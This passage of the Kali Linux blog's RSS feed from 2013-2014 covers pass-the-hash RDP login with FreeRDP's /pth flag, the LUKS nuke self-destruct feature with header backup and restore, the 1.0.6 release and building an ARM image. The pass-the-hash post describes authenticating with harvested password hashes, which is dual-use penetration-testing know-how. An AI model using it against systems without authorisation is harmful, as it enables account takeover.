href="https://gitlab.com/kalilinux/build-scripts/kali-cloud">Kali cloud build-scripts</a> , which we published as part of our <a href="https://www.kali.org/blog/kali-linux-1-0-6-release/">Kali 1.0.6 release</a>. These scripts can be edited to create your own custom images with whatever toolset you wish.</p> <h3 id="ask-us-anything-on-reddit">Ask Us Anything on Reddit</h3> <p>Tomorrow, Tuesday 21st Jan, 2014 from 1300 - 1500 EST, we are conducting a <a href="https://www.reddit.com/r/netsec/comments/1vryus/we_are_offensive_security_we_do_kali_linux/">Reddit AMA</a> (Ask Me Anything), revolving around OffSec, Kali Linux, and our other projects. You are welcome to join and ask us anything!</p></description>
</item>
<item>
<title>Passing the Hash with Remote Desktop</title>
<link>https://www.kali.org/blog/passing-hash-remote-desktop/</link>
<guid isPermaLink="true">https://www.kali.org/blog/passing-hash-remote-desktop/</guid>
<pubDate>Tue, 14 Jan 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/passing-hash-remote-desktop/images/kali-passing-the-hash.jpg" type="image/jpg"/>
<description><p>Kali Linux contains a large number of very useful tools that are beneficial to information security professionals. One set of such tools belongs to the <strong><a href="https://www.kali.org/blog/pass-the-hash-toolkit-winexe-updates/">Pass-the-Hash</a></strong> toolkit, which includes favorites such as <strong>pth-winexe</strong> among others, already packaged in Kali Linux. An example of easy command line access using pth-winexe is shown below.</p> <p><p> <a href='https://www.kali.org/blog/passing-hash-remote-desktop/images/Screen-Shot-2014-01-14-at-9.53.44-AM.png'> <img src="https://www.kali.org/blog/passing-hash-remote-desktop/images/Screen-Shot-2014-01-14-at-9.53.44-AM.png" alt="" /> </a> </p> </p> <p>We constantly strive to include new, useful tools to our repositories. Sometimes we feel that some of these tools do not get the attention they deserve and go under-reported. One such recent addition is the version of FreeRDP, which allows a penetration tester to use a password hash instead of a plain text password for authentication to the remote desktop service in Windows 2012 R2 and Windows 8.1.</p> <p>What&rsquo;s the big deal, you say? Traditional &ldquo;Pass-the-Hash&rdquo; attacks can be very powerful, but they are limited to command line access. Although in most cases that is enough, sometimes GUI access is just a better way to accomplish things.</p> <p>A few months ago, Mark Lowe from the Portcullis Labs published a <a href="https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/">blog post</a> on research he conducted against Windows 2012 R2 and Windows 8.1 RDP security improvements. It turns out that Microsoft, in their quest to mitigate &ldquo;Pass-the-Hash&rdquo; attacks, introduced something called &ldquo;Restricted Admin&rdquo; mode. You can read more about it <a href="https://docs.microsoft.com/en-us/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2">here</a>.</p> <p>Inadvertently however, this new security feature actually enabled the use of a password hash for RDP authentication purposes, thereby giving many pentesters once again a reason to smile. To add to the validity of the research by Mark, the FreeRDP project has added native support for Pass-the-Hash authentication to the FreeRDP package, which is now in Kali repos. To enjoy this new feature, simply install freerdp-x11:</p> <pre><code class="language-sh">apt-get update apt-get install freerdp-x11 </code></pre> <p>The new xfreerdp executable supports the &ldquo;/pth&rdquo; flag as shown below using our &ldquo;offsec&rdquo; domain user and the &ldquo;password&rdquo; hash.</p> <p><p> <a href='https://www.kali.org/blog/passing-hash-remote-desktop/images/pth-rdp.png'> <img src="https://www.kali.org/blog/passing-hash-remote-desktop/images/pth-rdp.png" alt="" /> </a> </p> </p> <p>And that&rsquo;s it! RDP sessions using harvested password hashes. Again, keep in mind that this only works on Windows 2012 R2 and Windows 8.1. To the best of our knowledge, the &ldquo;Restricted Admin&rdquo; feature has not been backported yet and considering this, it may never be.</p></description>
</item>
<item>
<title>How to Nuke your Encrypted Kali Installation</title>
<link>https://www.kali.org/blog/nuke-kali-linux-luks/</link>
<guid isPermaLink="true">https://www.kali.org/blog/nuke-kali-linux-luks/</guid>
<pubDate>Mon, 13 Jan 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/nuke-kali-linux-luks/images/kali-nuke-restore.jpg" type="image/jpg"/>
<description><p>There&rsquo;s been a <a href="https://www.reddit.com/r/netsec/comments/1ujsv4/emergency_self_destruction_of_luks_in_kali_linux/">fair amount of discussion</a> around the recently introduced <a href="https://www.kali.org/blog/emergency-self-destruction-luks-kali/">LUKS nuke patch</a> we added to the cryptsetup package in Kali Linux. We wanted to take this opportunity to better explain this feature, as well as demonstrate some useful approaches which are worthwhile getting to know.</p> <h3 id="luks-nuke-in-a-nutshell">LUKS Nuke in a Nutshell</h3> <p>As explained well By Michael Lee in his <a href="https://www.zdnet.com/article/developers-mull-adding-data-nuke-to-kali-linux/">ZDNet article</a>, when creating an encrypted LUKS container, a master key is generated at random. A passphrase is then used to encrypt the master key in turn. This process means that the passphrase is not directly coupled to the data. That is, if two sets of identical data are encrypted and the same passphrase used, the master keys remain unique to each set and cannot be swapped out. What this also means however, is that regardless of the passphrase used, if the master key is lost, recovering data is impossible. This process conveniently lends itself to being used as a nuke by deliberately wiping the keys.</p> <h3 id="example-use-case-of-luks-nuke">Example Use Case of LUKS Nuke</h3> <p>Our main purpose for introducing this feature in Kali Linux is to simplify the process of securely traveling with confidential client information. While &ldquo;LUKS Nuking&rdquo; your drive will result in an inaccessible disk, it <strong>is</strong> possible to backup your keyslots beforehand and restore them after the fact. What this allows us to do is to &ldquo;brick&rdquo; our sensitive laptops before any travel, separate ourselves from the restoration keys (which we encrypt), and then &ldquo;restore&rdquo; them to the machines once back in a safe location. This way, if our hardware is lost or otherwise accessed midway through our travels, no one is able to restore the data on it, including ourselves.</p> <p>There are other ways to delete your keyslots, however the advantage of the Nuke option is it is quick, easy, and does not require you to fully login to your Kali installation. If you maintain a backup of your header, you can Nuke the keyslots whenever you feel uncomfortable. Then conduct a restoration when you feel secure.</p> <h3 id="try-this-for-yourself">Try this for yourself</h3> <p>Let&rsquo;s go through the motions of encrypting, backing up, destroying, and then restoring your data using Kali Linux. Start by downloading and installing Kali Linux 1.0.6 with Full Disk Encryption. Once that is done, you can verify your information as follows:</p> <pre><code class="language-console">root@kali-crypto:~# cryptsetup luksDump /dev/sda5 LUKS header information for /dev/sda5 Version: 1 Cipher name: aes Cipher mode: xts-plain64 Hash spec: sha1 Payload offset: 4096 MK bits: 512 MK digest: 04 cd d0 51 bf 57 10 f5 87 08 07 d5 c8 2a 34 24 7a 89 3b db MK salt: 27 42 e5 a6 b2 53 7f de 00 26 d3 f8 66 fb 9e 48 16 a2 b0 a9 2c bb cc f6 ea 66 e6 b1 79 08 69 17 MK iterations: 65750 UUID: 126d0121-05e4-4f1d-94d8-bed88e8c246d Key Slot 0: ENABLED Iterations: 223775 Salt: 7b ee 18 9e 46 77 60 2a f6 e2 a6 13 9f 59 0a 88 7b b2 db 84 25 98 f3 ae 61 36 3a 7d 96 08 a4 49 Key material offset: 8 AF stripes: 4000 Key Slot 1: DISABLED Key Slot 2: DISABLED Key Slot 3: DISABLED Key Slot 4: DISABLED Key Slot 5: DISABLED Key Slot 6: DISABLED Key Slot 7: DISABLED </code></pre> <p>As you can see, we have slot 0 enabled with slots 1 to 7 unused. At this point, we will add our nuke key:</p> <pre><code class="language-console">root@kali-crypto:~# apt install cryptsetup-nuke-password root@kali-crypto:~# dpkg-reconfigure cryptsetup-nuke-password </code></pre> <p>This didn&rsquo;t change anything to the LUKS container, instead it installed the nuke password and a small hook in the initrd. This hook will detect when you enter your nuke password at boot time and it will call &ldquo;<strong>cryptsetup luksErase</strong>&rdquo; on your LUKS container at that time.</p> <p>Wonderful. Now we need to back up the encryption keys. This can easily be done with the &ldquo;luksHeaderBackup&rdquo; option:</p> <pre><code class="language-console">root@kali-crypto:~# cryptsetup luksHeaderBackup --header-backup-file luksheader.back /dev/sda5 root@kali-crypto:~# file luksheader.back luksheader.back: LUKS encrypted file, ver 1 [aes, xts-plain64, sha1] UUID: 126d0121-05e4-4f1d-94d8-bed88e8c246d root@kali-crypto:~# </code></pre> <p>So, in our case we would like to encrypt this data for storage. There are a number of ways this could be done, however we will use openssl to make the process quick and easy using default tools in Kali:</p> <pre><code class="language-console">root@kali-crypto:~# openssl enc -aes-256-cbc -salt -in luksheader.back -out luksheader.back.enc enter aes-256-cbc encryption password: Verifying - enter aes-256-cbc encryption password: root@kali-crypto:~# ls -lh luksheader.back* -r-------- 1 root root 2.0M Jan 9 13:42 luksheader.back -rw-r--r-- 1 root root 2.0M Jan 9 15:50 luksheader.back.enc root@kali-crypto:~# file luksheader.back* luksheader.back: LUKS encrypted file, ver 1 [aes, xts-plain64, sha1] UUID: 126d0121-05e4-4f1d-94d8-bed88e8c246d luksheader.back.enc: data </code></pre> <p>Great, now we have the encrypted header ready to be backed up. In this case, we would like to place the header somewhere that it is easily accessible. This could be as simple as on a USB thumb drive that is kept in a safe location. At this point, lets reboot and make use of the Nuke key and see how Kali responds.</p> <p>So we used the Nuke key, and as expected we can no longer boot into Kali. Let&rsquo;s see what happened on the actual disk by booting up into a Kali live CD and dumping the LUKS header again:</p> <pre><code class="language-console">root@kali:~# cryptsetup luksDump /dev/sda5 LUKS header information for /dev/sda5 Version: 1 Cipher name: aes Cipher mode: xts-plain64 Hash spec: sha1 Payload offset: 4096 MK bits: 512 MK digest: 04 cd d0 51 bf 57 10 f5 87 08 07 d5 c8 2a 34 24 7a 89 3b db MK salt: 27 42 e5 a6 b2 53 7f de 00 26 d3 f8 66 fb 9e 48 16 a2 b0 a9 2c bb cc f6 ea 66 e6 b1 79 08 69 17 MK iterations: 65750 UUID: 126d0121-05e4-4f1d-94d8-bed88e8c246d Key Slot 0: DISABLED Key Slot 1: DISABLED Key Slot 2: DISABLED Key Slot 3: DISABLED Key Slot 4: DISABLED Key Slot 5: DISABLED Key Slot 6: DISABLED Key Slot 7: DISABLED </code></pre> <p>As we can see, no keyslots are in use. The Nuke worked as expected. To restore the header back in place, it&rsquo;s a simple matter of retrieving the encrypted header from your USB drive. Once we have that, we can decrypt it and conduct our restore:</p> <pre><code class="language-console">root@kali:~# openssl enc -d -aes-256-cbc -in luksheader.back.enc -out luksheader.back enter aes-256-cbc decryption password: root@kali:~# cryptsetup luksHeaderRestore --header-backup-file luksheader.back /dev/sda5 WARNING! ======== Device /dev/sda5 already contains LUKS header. Replacing header will destroy existing keyslots. Are you sure? (Type uppercase yes): YES root@kali:~# cryptsetup luksDump /dev/sda5 LUKS header information for /dev/sda5 Version: 1 Cipher name: aes Cipher mode: xts-plain64 Hash spec: sha1 Payload offset: 4096 MK bits: 512 MK digest: 04 cd d0 51 bf 57 10 f5 87 08 07 d5 c8 2a 34 24 7a 89 3b db MK salt: 27 42 e5 a6 b2 53 7f de 00 26 d3 f8 66 fb 9e 48 16 a2 b0 a9 2c bb cc f6 ea 66 e6 b1 79 08 69 17 MK iterations: 65750 UUID: 126d0121-05e4-4f1d-94d8-bed88e8c246d Key Slot 0: ENABLED Iterations: 223775 Salt: 7b ee 18 9e 46 77 60 2a f6 e2 a6 13 9f 59 0a 88 7b b2 db 84 25 98 f3 ae 61 36 3a 7d 96 08 a4 49 Key material offset: 8 AF stripes: 4000 Key Slot 1: DISABLED Key Slot 2: DISABLED Key Slot 3: DISABLED Key Slot 4: DISABLED Key Slot 5: DISABLED Key Slot 6: DISABLED Key Slot 7: DISABLED </code></pre> <p>Our slots are now restored. All we have to do is simply reboot and provide our normal LUKS password and the system is back to its original state.</p></description>
</item>
<item>
<title>Kali Linux 1.0.6 Release</title>
<link>https://www.kali.org/blog/kali-linux-1-0-6-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-6-release/</guid>
<pubDate>Thu, 09 Jan 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-6-release/images/kali-1.0.6-release.jpg" type="image/jpg"/>
<description><h4 id="kernel-312-luks-nuke-amazon-ami--google-compute-images-and-more">Kernel 3.12, LUKS nuke, Amazon AMI / Google Compute images and more!</h4> <p>It&rsquo;s been a while since our last minor release which makes 1.0.6 a more significant update than usual. With a new 3.12 kernel, <a href="https://www.kali.org/blog/emergency-self-destruction-luks-kali/">a LUKS nuke feature</a>, new <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">Kali ARM build scripts</a>, and <a href="https://gitlab.com/kalilinux/build-scripts/kali-cloud">Kali AMAZON AMI and Google Compute image generation scripts</a>, not to mention numerous tool additions and updates - this release is really heavily laden with goodness. For more information about what&rsquo;s new in this release, check the <a href="https://bugs.kali.org/changelog_page.php">Kali changelog</a>.</p> <h4 id="kali-arm-build-scripts-now-available">Kali ARM Build Scripts Now Available</h4> <p>This new release brings with it the introduction of the <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">OffSec Trusted ARM image scripts</a> - a set of slowly growing scripts that are able to build Kali Linux images for various ARM devices. These scripts will replace the growing number of actual ARM image releases we have in order to reduce the exponentially growing amount of traffic we serve on each release. We will release a short blog post about how to use these scripts in the next few days.</p> <h4 id="luks-nuke-patch-added-to-cryptsetup">LUKS Nuke Patch Added to cryptsetup</h4> <p>A couple of days ago, we demonstrated a cool patch for cryptsetup, which introduces a self destruction feature. The response to this post was overwhelmingly positive, as many people voted to see this feature included in Kali Linux. Therefore, we included this patch into our cryptsetup package yesterday, making the <strong>luksAddNuke</strong> options available to all Kali users by default. The patch is non-invasive and will not change anything for anyone that does not want to make use of it. No action is necessary if you currently use LUKS and don&rsquo;t want to utilize the key nuke feature. The updated cryptsetup package is present in Kali 1.0.6 by default. We&rsquo;d like to take a moment to thank everyone who participated in the poll for voicing their opinion. This kind of feedback is very useful for us, giving us a better feel for the type of features to add in the future. In an upcoming blog post, we will take the opportunity to better explain this new feature and show you how to test it out.</p> <h4 id="updated-instructions-for-building-vmware-tools-with-kernel-312">Updated Instructions for Building VMware Tools with Kernel 3.12</h4> <p>VMware Tools always lags behind new kernels, which always causes us headaches and this time is no exception. At the time of this release, VMware Tools does not cleanly compile against kernel 3.12 and requires a set of patches. We have posted these <a href="https://web.archive.org/web/20140326155849/https://github.com/offensive-security/kali-vmware-tools-patches">Kali Linux VMware Tools patches on GitHub</a> along with instructions on how to use them. We suspect that these build issues will go away in future releases of VMware Tools.</p> <h4 id="kali-linux-amazon-amigoogle-compute-build-scripts-now-available">Kali Linux Amazon AMI/Google Compute Build Scripts Now Available</h4> <p>Yay! This was on our todo list for quite awhile and we&rsquo;re happy to bring this feature out at last. A <a href="https://gitlab.com/kalilinux/build-scripts/kali-cloud-build">set of scripts</a> that enables you to build your own custom Amazon AMI and Google Compute cloud images. If you intend to use the images for any real work, you should first consult with the <a href="https://aws.amazon.com/security/penetration-testing/">terms of service</a> of the cloud provider.</p> <h4 id="separation-of-kali-official-images-and-offsec-contributed-images">Separation of Kali Official Images and OffSec Contributed Images</h4> <p>Due to the ever growing number of ARM images <a href="https://www.offsec.com/">OffSec</a> is contributing as well as the high demand of more flavours of VMware images, we&rsquo;ve separated the Official Kali images from OffSec contributed images. This allows us to generate more VMware image flavours (amd64, i486, i686-pae), as well as increased flexibility in future releases. To find updated VMware and custom ARM images, visit the <a href="https://www.kali.org/get-kali/#kali-vm">OffSec Custom Image Download Page</a>. Please bear with us as we update images on this server in the next few days.</p> <h4 id="improving-kali-linux-package-features">Improving Kali Linux Package Features</h4> <p>In the past couple of weeks, <strong>@jerichodotm</strong> has been helping us add <a href="https://wiki.debian.org/debian/watch/">watch</a> files to our Kali packages. These watch files allow us to monitor upstream tarball releases for updates in a much more reliable manner. Once this process is complete, we&rsquo;ll be able to monitor new upstream software updates with much more ease. For example, if you want to check if there&rsquo;s a new upstream release of nmap, you could do the following:</p> <pre><code class="language-console">root@kali:~# apt-get install devscripts root@kali:~# apt-get source nmap root@kali:~# cd nmap-6.40/ root@kali:~/nmap-6.40# uscan --no-download --verbose -- Scanning for watchfiles in . -- Found watchfile in ./debian -- In debian/watch, processing watchfile line: http://nmap.org/dist/nmap-((?:\d+\.)+\d+)\.tgz -- Found the following matching hrefs: nmap-5.00.tgz nmap-5.20.tgz nmap-5.21.tgz nmap-5.50.tgz nmap-5.51.1.tgz nmap-5.51.2.tgz nmap-5.51.3.tgz nmap-5.51.4.tgz nmap-5.51.5.tgz nmap-5.51.6.tgz nmap-5.51.tgz nmap-6.00.tgz nmap-6.01.tgz nmap-6.25.tgz nmap-6.40.tgz Newest version on remote site is 6.40, local version is 6.40 =&gt; Package is up to date -- Scan finished root@kali:~/nmap-6.40# </code></pre> <h4 id="no-re-downloading-required">No Re-Downloading Required</h4> <p>Lastly, if you already have a Kali Linux installation up and running, you don&rsquo;t need to download a new ISO. You can easily upgrade your installation to the latest and greatest Kali Linux has to offer as follows:</p> <pre><code class="language-console">root@kali:~# apt-get update root@kali:~# apt-get dist-upgrade </code></pre> <h4 id="engage">&hellip;.Engage.</h4> <p>We&rsquo;re really happy with this release and are looking forward to completing our next goals with 1.0.7. As usual, you are welcome to visit our <a href="https://forums.kali.org/">Kali Linux forums</a> (which now default to HTTPS), read up on our <a href="https://www.kali.org/docs/">official documentation</a>, submit <a href="https://bugs.kali.org/">bugs and patches</a>, or chat with us in <a href="https://www.kali.org/docs/community/kali-linux-irc-channel/">IRC</a>, irc.oftc.net, #kali-linux.</p> <h4 id="shameless-plug">Shameless Plug</h4> <p>OffSec has recently updated its &ldquo;Penetration Testing With BackTrack&rdquo; online course to &ldquo;<a href="https://www.offsec.com/pwk-oscp/">Penetration Testing with Kali Linux</a>&rdquo;. If you&rsquo;re looking for official, quality training on Kali Linux, this is a great place to start. We&rsquo;re biased of course, but <a href="https://www.offsec.com/why-offsec/#testimonials">many other people seem to think so too!</a></p></description>
</item>
<item>
<title>Emergency Self Destruction of LUKS in Kali</title>
<link>https://www.kali.org/blog/emergency-self-destruction-luks-kali/</link>
<guid isPermaLink="true">https://www.kali.org/blog/emergency-self-destruction-luks-kali/</guid>
<pubDate>Mon, 06 Jan 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/emergency-self-destruction-luks-kali/images/kali-luks-self-destruct.jpg" type="image/jpg"/>
<description><h3 id="kali-linux-full-disk-encryption">Kali Linux Full Disk Encryption</h3> <p>As <a href="https://www.offsec.com/cyberversity/penetration-testing/">penetration testers</a>, we often need to travel with sensitive data stored on our laptops. Of course, we use full disk encryption wherever possible, including our Kali Linux machines, which tend to contain the most sensitive materials.</p> <p>Setting up <a href="https://www.kali.org/docs/installation/hard-disk-install/">full disk encryption with Kali</a> is a simple process. The Kali installer includes a straightforward process for setting up encrypted partitions with LVM and LUKS. Once encrypted, the Kali operating system requires a password at boot time to allow the OS to boot and decrypt your drive, thus protecting this data in case your laptop is stolen. Managing decryption keys and partitions is done using the cryptsetup utility.</p> <h3 id="nuking-our-kali-linux-fde-installation">Nuking our Kali Linux FDE Installation</h3> <p>A couple of days ago, one of us had the idea of adding a &ldquo;nuke&rdquo; option to our Kali install. In other words, having a boot password that would destroy, rather than decrypt, the data on our drive. A few Google searches later, we found an old <a href="http://lxer.com/module/newswire/view/103692/index.html">cryptsetup patch</a> by Juergen Pabel which does just that, adding a &ldquo;nuke&rdquo; password to cryptsetup, which when used, deletes all keyslots and makes the data on the drive inaccessible. We ported this patch for a recent version of cryptsetup and posted it on <a href="https://gitlab.com/kalilinux/packages/cryptsetup-nuke-keys">GitHub</a>.</p> <h3 id="testing-the-luks-nuke-patch">Testing the LUKS Nuke Patch</h3> <p>This feature isn&rsquo;t implemented yet in Kali as we wanted to gather some user feedback before applying this patch to base images. If you&rsquo;d like to try it our yourself, these are the build instructions. Start by running an LVM encrypted installation in Kali and set a decryption password. Once done, download the cryptsetup package source and apply our patch to it. Proceed to build the patched package as follows:</p> <pre><code class="language-console">root@kali:~# apt-get source cryptsetup root@kali:~# git clone https://gitlab.com/kalilinux/packages/cryptsetup-nuke-keys root@kali:~# cd cryptsetup-1.6.1/ root@kali:~/cryptsetup-1.6.1# patch -p1 &lt; ../cryptsetup-nuke-keys/cryptsetup_1.6.1+nuke_keys.diff patching file lib/libcryptsetup.h patching file lib/luks1/keymanage.c patching file lib/setup.c patching file src/cryptsetup.c root@kali:~/cryptsetup-1.6.1# dpkg-buildpackage -b -uc </code></pre> <p>Once the package has built, install the cryptsetup packages to get our <strong>nuke</strong> option implemented:</p> <pre><code class="language-console">root@kali:~/cryptsetup-1.6.1# ls -l ../*crypt*.deb -rw-r--r-- 1 root root 149430 Jan 4 21:34 ../cryptsetup_1.6.1-1kali0_amd64.deb -rw-r--r-- 1 root root 250616 Jan 4 21:34 ../cryptsetup-bin_1.6.1-1kali0_amd64.deb -rw-r--r-- 1 root root 105226 Jan 4 21:34 ../libcryptsetup4_1.6.1-1kali0_amd64.deb -rw-r--r-- 1 root root 49580 Jan 4 21:34 ../libcryptsetup-dev_1.6.1-1kali0_amd64.deb root@kali:~/cryptsetup-1.6.1# dpkg -i ../libcryptsetup*.deb root@kali:~/cryptsetup-1.6.1# dpkg -i ../cryptsetup*.deb </code></pre> <p>Now that our patched cryptsetup package has been installed, we can go ahead and add a &ldquo;nuke&rdquo; key to our setup:</p> <pre><code class="language-console">root@kali:~# cryptsetup luksAddNuke /dev/sda5 Enter any existing passphrase: (existing passphrase) Enter new passphrase for key slot: (nuke passphrase) </code></pre> <h3 id="hey-dude-wheres-my-drive">Hey Dude, Where&rsquo;s my Drive?</h3> <p>On any subsequent reboots, you will be asked for the LUKS decryption password each time as usual. If for whatever reason, you were to enter the nuke password, the saved keys would be purged rendering the data inaccessible. Should we implement this patch in the cryptsetup package? Let us know what you think via this quick poll. We&rsquo;ll keep this poll open for a couple of weeks and keep you posted with any further developments of this feature:</p> <pre><code class="language-plain">Cryptseup Nuke Option in Kali Add nuke features to cryptsetup ?* - [ ] Yes, add this feature! - [ ] Stop bothering me - [ ] No, leave cryptsetup alone. </code></pre> <p><strong>Update:</strong> The nuke patch has been introduced to Kali Linux and is available by default in <a href="https://www.kali.org/blog/kali-linux-1-0-6-release/">Kali Linux v1.0.6</a>.</p> <p><strong>Update:</strong> We&rsquo;ve posted an example use-case for the Nuke feature in a later &ldquo;<a href="https://www.kali.org/blog/nuke-kali-linux-luks/">How to nuke your encrypted Kali Linux installation</a>&rdquo; blog post.</p> <p><strong>Update:</strong> As of July 2019, Kali Linux no longer ships this cryptsetup patch, instead we introduced a cryptsetup-nuke-password package that provides a similar feature without modifying cryptsetup:</p> <pre><code class="language-console">root@kali:~# apt install cryptsetup-nuke-password root@kali:~# dpkg-reconfigure cryptsetup-nuke-password </code></pre></description>
</item>
<item>
<title>Ultimate Pentesting PwnBox (2013) - Utilite Pro</title>
<link>https://www.kali.org/blog/ultimate-pentesting-pwnbox-2013-utilite/</link>
<guid isPermaLink="true">https://www.kali.org/blog/ultimate-pentesting-pwnbox-2013-utilite/</guid>
<pubDate>Sun, 08 Dec 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/ultimate-pentesting-pwnbox-2013-utilite/images/kali-utilite-pro.jpg" type="image/jpg"/>
<description><p>We&rsquo;re always on the lookout for and interesting ARM hardware for Kali Linux. Whether it&rsquo;s a <a href="https://www.offsec.com/kali-linux/kali-linux-on-galaxy-note/">Galaxy Note</a> or a USB stick sized <a href="https://www.kali.org/docs/arm/ss808-mk808/">SS808</a>, we want to see Kali run on it. You can therefore imagine our excitement, when we first laid our eyes on the <a href="http://utilite-computer.com/web/utilite-pro-specifications/">Utilite pro</a>.</p> <p>Utilite Pro is a <strong>quad core</strong> ARM cortex-A9 machine with up to <strong>4 GB</strong> of RAM, up to <strong>512 GB mSATA SSD</strong>, HDMI and DVI-D output, <strong>dual (2x) 1GB nics</strong>, a built in wireless card and <strong>4 USB ports</strong>. And its fanless. With those type of specs, this little beauty was unlikely to skip our radars. We wanted Kali Linux on that baby, <strong>real bad</strong>.</p> <p>We took this opportunity to create and publish the <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">OffSec Kali Linux contributed ARM images</a>, and thought we&rsquo;d demonstrate the use of these scripts, and show you how to get Kali Linux on the Utilite Pro. From there, the options are endless.</p> <p>The Utilite Pro came with Ubuntu preinstalled. The first thing we wanted to do, is update the machines uBoot bootloader image, to allow for support of 1.8V microSD cards:</p> <pre><code class="language-console">root@utilite:~# apt-get install mtd-utils root@utilite:~# git clone https://gitlab.com/kalilinux/build-scripts/kali-uboot-images.git uboot root@utilite:~/uboot# ./cm-fx6-bootloader-update.sh CompuLab CM-FX6 (Utilite) boot loader update utility 1.1 (Nov 25 2013) &gt;&gt; Checking for utilities... &gt;&gt; ...Done &gt;&gt; Board CPU: mx6q &gt;&gt; Board DRAM: 2gb &gt;&gt; Looking for boot loader image file: cm-fx6-u-boot-mx6q-2gb &gt;&gt; ...Found &gt;&gt; Looking for SPI flash: mtd0 &gt;&gt; ...Found &gt;&gt; Current U-Boot version in SPI flash: U-Boot 2009.08-cm-fx6-0.87+tools (Oct 06 2013 - 13:46:27) &gt;&gt; New U-Boot version in file: (248K) &gt;&gt; Proceed with the update? 1) Yes 2) No #? Yes ** Do not power off or reset your computer!!! &gt;&gt; Erasing SPI flash... Erasing 4 Kibyte @ bf000 -- 100 % complete &gt;&gt; ...Done &gt;&gt; Writing boot loader to the SPI flash... ........... &gt;&gt; ...Done &gt;&gt; Checking boot loader in the SPI flash... . &gt;&gt; ...Done &gt;&gt; Boot loader update succeeded! root@utilite:~/uboot# </code></pre> <p>Once that was done, we whipped out our OffSec Trusted Contributed ARM image scripts, and let our Utilite image builder script loose. On a separate 32 bit Kali Linux machine, we set up all the pre-requisites to build our ARM image, and make sure we have at least 10GB of free space. We start with downloading and setting up the ARM cross compiler and the build scripts:</p> <pre><code class="language-console">root@builder:~# git clone https://gitlab.com/kalilinux/build-scripts/kali-arm.git Cloning into 'kali-arm-build-scripts'... remote: Counting objects: 95, done. remote: Compressing objects: 100% (57/57), done. remote: Total 95 (delta 62), reused 70 (delta 37) Unpacking objects: 100% (95/95), done. root@builder:~# git clone https://gitlab.com/kalilinux/packages/gcc-arm-linux-gnueabihf-4-7.git Cloning into 'gcc-arm-linux-gnueabihf-4.7'... remote: Counting objects: 5839, done. remote: Compressing objects: 100% (3105/3105), done. remote: Total 5839 (delta 2559), reused 5837 (delta 2559) Receiving objects: 100% (5839/5839), 74.64 MiB | 3.38 MiB/s, done. Resolving deltas: 100% (2559/2559), done. root@builder:~# </code></pre> <p>Once that&rsquo;s done, we next run the build-deps scripts, which will install all the dependencies required for the build:</p> <pre><code class="language-console">root@builder:~# cd kali-arm-build-scripts/ root@builder:~/kali-arm-build-scripts# ./build-deps.sh Reading package lists... Done Building dependency tree Reading state information... Done abootimg is already the newest version. ... </code></pre> <p>Now with everything in place, we kick off our Utilite image builder script, and go for a coffee, or six. The script requires a version parameter for the image, which is something we use to tag our ARM image versions. Once ready, you should get a *full* Kali Linux image which can then be dd&rsquo;ed to a microSD card. Of course, you are encouraged to read the build script, and edit any installation parameters or packages to your needs:</p> <pre><code class="language-console">root@builder:~/kali-arm-build-scripts# ./utilite.sh 1.0 I: Retrieving Release I: Retrieving Release.gpg I: Checking Release signature I: Valid Release signature (key id 44C6513A8E4FB3D30875F758ED444FF07D8D0BF6) I: Retrieving Packages I: Validating Packages I: Resolving dependencies of required packages... I: Resolving dependencies of base packages... ... ... ... Cloning into 'firmware'... remote: Counting objects: 874, done. remote: Compressing objects: 100% (685/685), done. remote: Total 874 (delta 181), reused 849 (delta 167) Receiving objects: 100% (874/874), 30.17 MiB | 4.84 MiB/s, done. Resolving deltas: 100% (181/181), done. del devmap : loop0p2 del devmap : loop0p1 Removing temporary build files Generating sha1sum for kali-1.0-utilite.img Compressing kali-1.0-utilite.img Generating sha1sum for kali-1.0-utilite.img.xz root@builder:~/kali-arm-build-scripts# </code></pre> <p>Once the image is ready, you can find it in the utlite subdirectory created by the script:</p> <pre><code class="language-console">root@builder:~/kali-arm-build-scripts# ls -l utilite-1.0/ total 334720 -rw-r--r-- 1 root root 63 Dec 7 23:48 kali-1.0-utilite.img.sha1sum -rw-r--r-- 1 root root 342742176 Dec 7 23:52 kali-1.0-utilite.img.xz -rw-r--r-- 1 root root 66 Dec 7 23:53 kali-1.0-utilite.img.xz.sha1sum root@builder:~/kali-arm-build-scripts# </code></pre> <p>Extract the compressed image file, and <strong>dd</strong> it to the microSD card (in our case, <strong>sdb</strong>). Once done, pop the microSD card into the Utilite, and boot it up!</p> <pre><code class="language-console">root@proxy:~/kali-arm-build-scripts# cd utilite-1.0/ root@proxy:~/kali-arm-build-scripts/utilite-1.0# 7z x kali-1.0-utilite.img.xz 7-Zip [64] 9.20 Copyright (c) 1999-2010 Igor Pavlov 2010-11-18 p7zip Version 9.20 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,4 CPUs) Processing archive: kali-1.0-utilite.img.xz Extracting kali-1.0-utilite.img Everything is Ok Size: 7340032000 Compressed: 342742176 root@proxy:~/kali-arm-build-scripts/utilite-1.0# dd if=kali-1.0-utilite.img of=/dev/sdb bs=1M </code></pre> <p>Once booted, you can log into the Utlite image with <strong>root / toor</strong> credentials:</p> <pre><code class="language-console">root@kali:~# uname -a Linux kali 3.0.35-cm-fx6-4 #1 SMP Sat Dec 7 23:47:48 EST 2013 armv7l GNU/Linux root@kali:~# cat /proc/cpuinfo Processor : ARMv7 Processor rev 10 (v7l) processor : 0 BogoMIPS : 790.52 processor : 1 BogoMIPS : 790.52 processor : 2 BogoMIPS : 790.52 processor : 3 BogoMIPS : 790.52 Features : swp half thumb fastmult vfp edsp neon vfpv3 CPU implementer : 0x41 